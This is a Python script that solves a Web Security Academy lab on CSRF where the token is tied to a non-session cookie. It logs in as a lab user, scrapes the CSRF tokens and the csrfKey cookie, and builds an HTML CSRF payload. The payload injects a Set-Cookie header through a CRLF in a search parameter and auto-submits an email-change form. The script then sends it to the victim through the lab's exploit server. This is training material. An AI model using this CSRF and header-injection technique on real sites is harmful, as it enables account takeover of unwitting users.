###################################################################################
#
# Author: Ahmed Elqalawy (@elqal3awii)
#
# Date: 21/10/2023
#
# Lab: CSRF where token is tied to non-session cookie
#
# Steps: 1. Fetch the login page
#        2. Extract csrf token, session cookie and csrf key cookie
#        3. Login as wiener
#        4. Fetch wiener profile
#        5. Extract the csrf token that is needed for email update
#        6. Craft an HTML form for changing the email address that includes
#           the extracted csrf token and an img tag which is used to set the csrfKey
#           cookie via its src and submit the form via its error handler
#        7. Deliver the exploit to the victim
#        8. The victim's email will be changed after they trigger the exploit
#
###################################################################################


###########
# imports
###########
import requests
from colorama import Fore
import re

#########
# Main
#########

# change this to your lab URL
lab_url = "https://0a00007304ef5d5781053e0700dd009d.web-security-academy.net"

# change this to your exploit server URL
exploit_server_url = "https://exploit-0a7200c304f15da681263dc6011600a7.exploit-server.net"

# the header of your exploit sever response
exploit_server_head = "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8"
    
try:  
    # fetch login page
    get_login = requests.get(f"{lab_url}/login")

except:
    print(Fore.RED + "[!] Failed to fetch login page through exception")
    exit(1) 

print(Fore.WHITE + "⦗1⦘ Fetching the login page.. " + Fore.GREEN + "OK")

# get session cookie
session = get_login.cookies.get("session")

# get csrfKey cookie
csrf_key = get_login.cookies.get("csrfKey")

# set cookies
cookies = {
    "session": session,
    "csrfKey": csrf_key
}

# extract the csrf token
csrf_token = re.findall("csrf.+value=(.+)>", get_login.content.decode())[0]

print(Fore.WHITE + "⦗2⦘ Extracting csrf token, session cookie and csrf key cookie.. " + Fore.GREEN + "OK")

# set credentials
data = {
    "username": "wiener",
    "password": "peter",
    "csrf": csrf_token
}

try:    
    # login as wiener
    login = requests.post(f"{lab_url}/login", data, cookies=cookies, allow_redirects=False)
    
except:
    print(Fore.RED + "[!] Failed to login as wiener through exception")
    exit(1)

print(Fore.WHITE + "⦗3⦘ Logging in as wiener.. " + Fore.GREEN + "OK")

# get the new session
session = login.cookies.get("session")

# set session cookie
cookies = {
    "session": session
}

try:  
    # fetch wiener profile
    wiener = requests.get(f"{lab_url}/my-account", cookies=cookies)
    
except:
    print(Fore.RED + "[!] Failed to fetch wiener profile through exception")
    exit(1)

print(Fore.WHITE + "⦗4⦘ Fetching wiener profile.. " + Fore.GREEN + "OK")

# get csrfKey cookie
csrf_key = wiener.cookies.get("csrfKey")

# extract the csrf token that is needed for email update
csrf_token = re.findall("csrf.+value=(.+)>", wiener.content.decode())[0]

print(Fore.WHITE + "⦗5⦘ Extracting the csrf token that is needed for email update.. " + Fore.GREEN + "OK")

# the new email
# you can change this to what you want
new_email = "hacked@you.com"

# payload to change the victim's email
payload = f"""<html>
                <body>
                <form action="{lab_url}/my-account/change-email" method="POST">
                    <input type="hidden" name="email" value="{new_email}" />
                    <input type="hidden" name="csrf" value="{csrf_token}" />
                    <input type="submit" value="Submit request" />
                </form>
                <img src="{lab_url}/?search=boo%0d%0aSet-Cookie: csrfKey={csrf_key}; SameSite=None" onerror=document.forms[0].submit()>
                </body>
            </html>"""

# data to send via POST
data = {
    "formAction": "DELIVER_TO_VICTIM",
    "urlIsHttps": "on",
    "responseFile": "/exploit",
    "responseHead": exploit_server_head,
    "responseBody": payload,
}

try:
    # deliver the exploit to the victim
    res = requests.post(exploit_server_url, data)

except:
    print(Fore.RED + "[!] Failed to deliver the exploit to the victim through exception")
    exit(1)

print(Fore.WHITE + "⦗6⦘ Delivering the exploit to the victim.. " + Fore.GREEN + "OK")
print(Fore.WHITE + "🗹 The victim's email will be changed after they trigger the exploit") 
print(Fore.WHITE + "🗹 Check your browser, it should be marked now as " + Fore.GREEN + "solved")



